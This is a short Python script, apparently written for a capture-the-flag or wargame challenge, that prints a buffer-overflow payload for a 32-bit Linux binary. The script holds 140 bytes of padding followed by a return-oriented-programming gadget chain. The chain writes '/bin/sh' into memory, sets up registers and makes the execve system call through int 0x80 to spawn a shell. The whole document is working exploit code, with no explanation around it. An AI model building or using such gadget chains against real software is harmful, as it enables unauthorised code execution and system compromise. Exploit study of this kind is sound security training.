#!/usr/bin/python

#h0rac

import struct

p = "A" * 140

p += struct.pack("I",0x0806ec5a) # :pop edx ; ret
p += struct.pack("I",0xb7ffc040) # :write to mapped memory // this will be poped to edx
p += struct.pack("I",0x080bbf26) # :pop eax ; ret 
p += "/bin" # : this will be poped to eax
p += struct.pack("I",0x0809a95d) # :mov dword ptr [edx], eax ; ret
p += struct.pack("I",0x080bbf26) # :pop eax ; ret
p += "/sh\x00"
p += struct.pack("I",0x08065bb9) # :mov dword ptr [edx + 4], eax ; mov eax, edx ; ret


p += struct.pack("I",0x0808ee06)  # :mov eax, 0xc ; pop edi ; ret
p += "JUNK"
p += struct.pack("I",0x0805465a)  #  :sub eax, 1 ; pop ebx ; ret
p += struct.pack("I",0xb7ffc040)

p += struct.pack("I",0x080e55ad) # :pop ecx ; ret
p += struct.pack("I",0xffffffff)
p += struct.pack("I",0x080db234) # :inc ecx ; ret
p += struct.pack("I",0x0806ec5a) # :pop edx ; ret
p += struct.pack("I",0xffffffff)
p += struct.pack("I",0x0805d3c7) # :inc edx ; ret
p += struct.pack("I",0x08049401) #: int 0x80

print p

